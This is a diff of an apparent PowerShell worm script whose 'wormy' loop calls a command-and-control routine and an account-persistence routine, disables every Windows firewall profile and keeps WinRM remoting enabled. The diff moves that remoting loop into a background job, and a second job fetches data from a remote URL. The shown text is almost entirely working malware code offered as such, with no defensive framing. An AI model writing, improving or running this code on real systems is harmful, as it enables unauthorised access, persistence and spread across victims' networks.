@@ -88,13 +88,6 @@ function accountPersist{
 
 }
 
-
-function keepWINRMAlive{
-    While(1 -eq 1){
-        Enable-PSRemoting -force
-        start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)
-    }
-}
 function wormy{
     
     while(1 -eq 1){
@@ -102,7 +95,7 @@ function wormy{
         [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
         cNc
         accountPersist
-        keepWINRMAlive
+        
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
         [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
         Write-Output 'slither'
@@ -138,7 +131,10 @@ function wormy{
         }
 }
 
-
+start-job -ScriptBlock{
+    Enable-PSRemoting -force
+    start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)
+}
 start-job -ScriptBlock{
     
     $toAppend=invoke-restmethod $timeURL
